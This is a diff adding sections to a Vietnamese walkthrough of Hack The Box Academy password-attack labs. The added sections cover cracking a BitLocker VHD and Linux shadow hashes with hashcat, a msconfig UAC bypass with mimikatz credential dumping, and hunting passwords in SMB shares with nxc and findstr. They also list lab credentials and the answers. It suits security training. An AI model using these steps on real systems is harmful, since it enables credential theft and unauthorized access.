@@ -1,3 +1,75 @@
+# Cracking Protected Archives
+#### Questions
++ 0  Run the above target then navigate to http://ip:port/download, then extract the downloaded file. Inside, you will find a password-protected VHD file. Crack the password for the VHD and submit the recovered password as your answer.
+
+Lấy hash của file:
+
+```zsh
+bitlocker2john -i Private.vhd > private.hash
+```
+
+Lấy hash cần thiết
+```zsh
+grep "bitlocker\$0" private.hashes > private.hash
+```
+
+Chạy hashcat crack thu được pass là `francisco`
+
+```zsh
+hashcat -m 22100 private.hash /usr/share/wordlists/rockyou.txt -o private_cracked.txt
+```
+
++ 0  Mount the BitLocker-encrypted VHD and enter the contents of flag.txt as your answe
+
+Chúng ta sẽ mount trên linux, tuy hơi rắc rối một chút nhưng dành cho khi không dùng máy ảo hoặc host là linux luôn.
+
+```zsh
+sudo apt install dislocker qemu-utils -y
+```
+
+Load kernel module NBD
+```zsh
+sudo modprobe nbd max_part=16
+```
+
+Gắn file .VHD, .VHDx... vào một thiết bị như ndb0
+```zsh
+sudo qemu-nbd -c /dev/nbd0 Private.vhd
+```
+
+Tạo thư mục để mount
+```zsh
+sudo mkdir /mnt/bitlocker
+```
+
+Giải mã phân vùng bằng mật khẩu
+```zsh
+sudo dislocker -V /dev/nbd0p1 -ufrancisco -- /mnt/bitlocker
+```
+
+File giải mã sẽ nằm tại /mnt/bitlocker/dislocker-file. Mount file này vào thư mục mong muốn:
+```zsh
+sudo mkdir /mnt/decrypted
+sudo mount -o loop /mnt/bitlocker/dislocker-file /mnt/decrypted
+```
+
+Lấy nội dung:
+```zsh
+cd /mnt/decrypted
+cat flag.txt
+```
+
+![](images/69.png)
+
+Xong việc, dọn dẹp sạch sẽ:
+
+```zsh
+sudo umount /mnt/decrypted
+sudo umount /mnt/bitlocker
+sudo qemu-nbd -d /dev/nbd0
+sudo rmdir /mnt/decrypted && sudo rmdir /mnt/bitlocker
+sudo modprobe -r nbd
+```
 # Network Services
 + 0  Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
 
@@ -294,6 +366,49 @@ frontdesk:58a478135a93ac3bf058a5ea0e8fdb71
 frontdesk:58a478135a93ac3bf058a5ea0e8fdb71:Password123
 ```
 
+
+# Attacking Windows Credential Manager
+
+#### Questions
+
+ RDP to 10.129.234.171 (ACADEMY-PWATTCK-CREDDEV01) with user "sadams" and password "totally2brow2harmon@"
+
++ 0  What is the password mcharles uses for OneDrive?
+
+```cmd
+runas /savecred /user:SRV01\mcharles cmd
+```
+
+Sau khi có shell của mcharles, ta tiến hành bypass UAC bằng msconfig
+
+```cmd
+msconfig.exe
+```
+
+Vào mục tools, tìm `command prompt` rồi chọn launch
+![](images/77.png)
+
+Khi này chúng ta có thể chạy mimikatz.exe mà không bị ràng buộc với quyền admin. Hãy thử privilege::debug để kiểm tra đầu ra, sau đó tiền hành dump:
+
+```cmd
+sekurlsa::credman
+```
+
+Thu được một mật khẩu của người dùng, đây không phải là password cho onedrive.
+
+![](images/76.png)
+
+Chúng ta cần rdp với phiên của người dùng này
+
+```zsh
+xfreerdp3 /v:10.129.234.171 /u:mcharles /p:proofs1insight1rustles!
+```
+
+![](images/75.png)
+
+Khi này chạy cmd với quyền admin rồi dump bằng mimikatz.exe thêm một lần nữa.
+
+![](images/74.png)
 # Attacking LSASS
 
 + 0  What is the name of the executable file associated with the Local Security Authority Process?
@@ -840,6 +955,29 @@ Check nốt thư mục còn lại, Ansible Script:
 
 ![](images/23.png)
 
+# Linux Authentication Process
+
+#### Questions
+
++ 0  Download the attached ZIP file (linux-authentication-process.zip), and use single crack mode to find martin's password. What is it?
+```zsh
+unshadow passwd shadow > unshadowed
+```
+
+```zsh
+hashcat -m 1800 -a 0 $(cat unshadowed| grep martin | cut -d ':' -f2) /usr/share/wordlists/rockyou.txt -o martin_cracked
+```
+
+![](images/78.png)
+ [linux-authentication-process.zip](https://academy.hackthebox.com/storage/modules/147/linux-authentication-process.zip)
+
++ 0  Use a wordlist attack to find sarah's password. What is it?
+
+```zsh
+hashcat -m 1800 $(cat unshadowed| grep sarah | cut -d ':' -f2) /usr/share/wordlists/rockyou.txt -o martin_cracked
+```
+
+![](images/79.png)
 
 # Credential Hunting in Linux
 
@@ -901,6 +1039,114 @@ Password: TUqr7QfLTLhruhVbCP
 
 Hoặc mò trong này:
 ![](images/25.png)
+
+# Credential Hunting in Network Traffic
+
+#### Questions
+
++ 0  The packet capture contains cleartext credit card information. What is the number that was transmitted?
+
+ [credential-hunting-in-network-traffic.zip](https://academy.hackthebox.com/storage/modules/147/credential-hunting-in-network-traffic.zip)
+
+![](images/73.png)
+
++ 0  What is the SNMPv2 community string that was used?
+
+![](images/72.png)
+
++ 0  What is the password of the user who logged into FTP?
+
+![](images/71.png)
+
++ 1  What file did the user download over FTP?
+
+![](images/70.png)
+
+# Credential Hunting in Network Shares
+#### Questions
+
+ RDP to  with user "mendres" and password "Inlanefreight2025!"
+
++ 0  One of the shares mendres has access to contains valid credentials of another domain user. What is their password?
+
+```powershell
+Import-Module .\PowerHuntShares.psm1
+Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public
+```
+
+Chúng ta chạy PowerHuntShares và xem report, đưa ra chiến thuật hợp lý để spider với nxc:
+
+![](images/80.png)
+
+```zsh
+nxc smb 10.129.147.131 -u mendres -p 'Inlanefreight2025!' --spider HR --content --pattern "passw"
+```
+![](images/81.png)
+Tiếp theo lấy file khả nghi có chuỗi password về
+
+```zsh
+nxc smb 10.129.147.131 -u mendres -p 'Inlanefreight2025!' --share 'HR' --get-file "\Public\Onboarding_Docs_485.docx" ~/Downloads/Onboarding_Docs_485.docx
+```
+
+Chúng ta có thể tải sang máy host windows để xem hoặc dùng string hoặc tải lên một trang web xem .docx online hoặc dùng bộ libre office nếu bạn có sẵn :v
+
+![](images/82.png)
+
+```cred
+NOTE:user=hr_backup
+password=HRrocks2025!
+```
+
+Có vẻ như thông tin này không dùng được, tuy vậy điều kì diệu đã xuất hiện khi tôi tìm thấy file này trong IT/Tools
+![](images/83.png)
+
++ 0  As this user, search through the additional shares they have access to and identify the password of a domain administrator. What is it?
+
+Chúng ta sẽ lấy phiên với thông tin đăng nhập mới:
+```zsh
+xfreerdp3 /v:$ip /u:jbader /p:'ILovePower333###'
+```
+
+Liệt kê Shares với smb map, người dùng này có thể truy cập vào Finance và Sales, Marketing và IT\Admin
+
+![](images/84.png)
+
+Chúng ta sẽ kiểm tra với câu lệnh truy vấn đơn giản cho từng thư mục mà chúng ta có đặc quyền
+
+```cmd
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+```
+
+Tôi tìm ra rất nhiều mật khẩu và tổng hợp lại, tuy nhiên khi tôi đọc dòng này, hầu hết chúng là giả.
+
+```
+Summer2023!
+Templates#1
+SecureDocs99
+Form@1234
+docAccess!@
+HRrocks2025!
+ILovePower333###
+Brand2025!
+qwerty#2023
+FinanceRules99
+password1234
+FinSecure!
+Summer2024!
+Welcome2022!
+Draft456!
+```
+
+![](images/85.png)
+
+Trong thư mục HR, khi truy vấn với lệnh trên bạn sẽ thấy:
+
+![](images/86.png)
+
+Một trong số chúng chứa thứ ta cần tìm:
+
+![](images/87.png)
+
 # Passwd, Shadow & Opasswd
 
 + 0  Examine the target using the credentials from the user Will and find out the password of the "root" user. Then, submit the password as the answer.
